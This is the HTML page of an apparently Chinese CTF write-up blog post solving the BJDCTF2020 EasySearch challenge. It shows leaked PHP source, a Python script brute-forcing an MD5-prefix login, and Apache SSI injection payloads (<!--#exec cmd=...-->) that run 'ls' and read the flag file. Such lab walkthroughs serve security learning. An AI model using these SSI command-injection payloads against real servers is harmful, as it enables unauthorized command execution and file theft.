@@ -1,0 +1,424 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>BJDCTF2020 EasySearch - Αιώνιος</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content=" 参考博客：
+https://blog.csdn.ne...">
+  <meta name="author" content="4v1d">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/cute.jpg" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/cute.jpg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/cute.jpg">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v1.hitokoto.cn/?encode=text&c=d',
+          data_contents: ''
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: 'search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Αιώνιος" type="application/atom+xml">
+</head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">BJDCTF2020 EasySearch</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 相册</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/cover/nine.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">BJDCTF2020 EasySearch</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 02, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2770</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <p> 参考博客：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/devilare/article/details/119351945">https://blog.csdn.net/devilare/article/details/119351945</a>    </p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)">https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)</a></p>
+<p>打开后只有一个输入框</p>
+<p>尝试了一下sql注入</p>
+<p>只会出现一样的弹框</p>
+<p><img   class="lazyload" data-original="/2021/09/02/2021/ctf/18/image-20210902195901927.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210902195901927"></p>
+<p>扫描目录后发现还有swp文件</p>
+<p>访问得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>	ob_start();<br>	function get_hash()&#123;<br>		$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;<br>		$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times<br>		$content &#x3D; uniqid().$random;<br>		return sha1($content); <br>	&#125;<br>    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);<br>	***<br>    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )<br>    &#123;<br>        $admin &#x3D; &#39;6d0bc1&#39;;<br>        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;<br>            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;<br>            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;<br>            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);<br>            $text &#x3D; &#39;<br>            ***<br>            ***<br>            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;<br>            ***<br>			***&#39;;<br>            fwrite($shtml,$text);<br>            fclose($shtml);<br>            ***<br>			echo &quot;[!] Header  error ...&quot;;<br>        &#125; else &#123;<br>            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;<br>            <br>    &#125;else<br>    &#123;<br>	***<br>    &#125;<br>	***<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>映入眼帘的就是hash函数</p>
+<p>注意到登陆代码</p>
+<p><img   class="lazyload" data-original="/2021/09/02/2021/ctf/18/image-20210902200408592.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210902200408592"></p>
+<p>​        解释起来，就是password必须hash加密后要等于6d0bc1，满足后就会输出script弹窗 </p>
+<p>‘Welcome to manage system’</p>
+<p><img   class="lazyload" data-original="/2021/09/02/2021/ctf/18/image-20210902200802654.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210902200802654"></p>
+<p>登录成功后会生成相应的shtml文件</p>
+<p>开始解题</p>
+<p>先得到脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"># -*- coding: utf-8 -*-<br>import hashlib<br>import threading<br>string &#x3D; &#39;0123456789&#39;<br>class BF(threading.Thread):<br>    def __init__(self,left,right):<br>        threading.Thread.__init__(self) #父类的构造方法<br>        self.left &#x3D; left<br>        self.right &#x3D; right<br>    def run(self):<br>        admin &#x3D; &#39;6d0bc1&#39;<br>        for i in range(self.left,self.right):<br>            s &#x3D; hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()<br>            if s[:6] &#x3D;&#x3D; admin:<br>                print i<br>threads &#x3D; []<br>thread_count &#x3D; 5<br>for i in range(thread_count):<br>    threads.append(BF(i*2000000, (i+1)*2000000))<br>for t in threads:<br>    t.start()<br>for t in threads:<br>    t.join()<br><br></code></pre></td></tr></table></figure>
+
+<p>跑完后：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">\<span class="hljs-meta">#2020666</span><br>\<span class="hljs-meta">#2305004</span><br>\<span class="hljs-meta">#9162671</span><br></code></pre></td></tr></table></figure>
+
+<p>选择其中一个密码登录</p>
+<p>然后查看网络状态</p>
+<p><img   class="lazyload" data-original="/2021/09/02/2021/ctf/18/image-20210902201334561.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210902201334561"></p>
+<p>用这里的路径访问下</p>
+<p><img   class="lazyload" data-original="/2021/09/02/2021/ctf/18/image-20210902201420408.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210902201420408"></p>
+<p>看wp知道了后面用ssti模板注入</p>
+<p>这里有一个知识点</p>
+<p><strong>Apache SSI 远程命令执行漏洞</strong><br>链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p>
+<p><img   class="lazyload" data-original="/2021/09/02/2021/ctf/18/image-20211028185301599.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20211028185301599"></p>
+<!--#exec cmd="whoami"-->
+
+<p><img   class="lazyload" data-original="/2021/09/02/2021/ctf/18/image-20210902201644511.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210902201644511"></p>
+<!--#exec cmd="ls"-->
+
+<p><img   class="lazyload" data-original="/2021/09/02/2021/ctf/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201754915.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210902201754915"></p>
+<!--#exec cmd="ls ../"-->  #看一下上层目录
+
+<p><img   class="lazyload" data-original="/2021/09/02/2021/ctf/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201952167.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210902201952167"></p>
+<p>找到了</p>
+<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"-->
+
+<p><img   class="lazyload" data-original="/2021/09/02/2021/ctf/18/image-20210902202133502.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210902202133502"></p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>4v1d</li>
+    <li><strong>本文链接：</strong><a href="http://daweitech.github.io/2021/09/02/2021/ctf/18/index.html" title="http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;09&#x2F;02&#x2F;2021&#x2F;ctf&#x2F;18&#x2F;index.html">http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;09&#x2F;02&#x2F;2021&#x2F;ctf&#x2F;18&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2021/09/03/2021/ctf/19/"><i class="iconfont iconleft"></i>MRCTF2020 Ezpop</a>
+    <a href="/2021/09/01/2021/ctf/17/">GYCTF2020 FlaskApp<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=905095727 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
